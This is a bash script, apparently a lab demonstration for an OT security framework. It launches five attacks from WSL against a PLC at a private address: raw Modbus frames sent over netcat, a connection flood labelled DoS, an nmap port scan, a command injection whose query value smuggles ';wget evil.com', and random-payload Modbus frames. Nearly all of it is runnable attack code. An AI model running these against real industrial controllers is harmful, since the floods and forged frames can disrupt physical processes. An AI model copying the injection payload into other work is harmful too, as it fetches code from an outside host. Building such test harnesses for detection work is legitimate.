#!/bin/bash
# Run this on WSL (172.20.96.57)

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║     OT SECURITY FRAMEWORK - ATTACK DEMONSTRATION             ║"
echo "║                   (Run from WSL)                            ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

# ATTACK 1: External PLC Access (from WSL to PLC)
echo -e "${YELLOW}[ATTACK 1/5]${NC} Unauthorized External PLC Access"
echo "  From WSL ($(hostname -I | awk '{print $1}')) to PLC"
echo -e "\x00\x01\x00\x00\x00\x06\x01\x5a\x00\x00\x00\x01" | nc -v -w 2 192.168.0.103 1502 2>&1
echo ""
sleep 2

# ATTACK 2: Connection Flood
echo -e "${YELLOW}[ATTACK 2/5]${NC} PLC Connection Flood (DoS)"
for i in {1..30}; do nc -zv -w 1 192.168.0.103 1502 2>&1; done | grep -c "open"
echo ""
sleep 2

# ATTACK 3: Port Scan
echo -e "${YELLOW}[ATTACK 3/5]${NC} OT Port Scan"
nmap -p 1502,502,5672,8090,9090 192.168.0.103 >/dev/null | grep -E "open|PORT"
echo ""
sleep 2

# ATTACK 4: Command Injection
echo -e "${YELLOW}[ATTACK 4/5]${NC} Command Injection"
curl -s -X POST "http://127.0.0.1:8090/direct-write/test?value=;wget%20evil.com" 2>/dev/null
echo ""
sleep 2

# ATTACK 5: ML Anomaly
echo -e "${YELLOW}[ATTACK 5/5]${NC} ML-Based Slow Drip Anomaly"
for i in 1 2 3; do
    RANDOM_PAYLOAD=$(openssl rand -hex 12)
    echo -e "  Sending: $RANDOM_PAYLOAD"
    echo -e "\x00\x01\x00\x00\x00\x06\x01\x5a$RANDOM_PAYLOAD" | nc -v -w 1 192.168.0.103 1502 2>/dev/null
    sleep 2
done

echo -e "\n${GREEN}✅ All attacks completed from WSL${NC}"
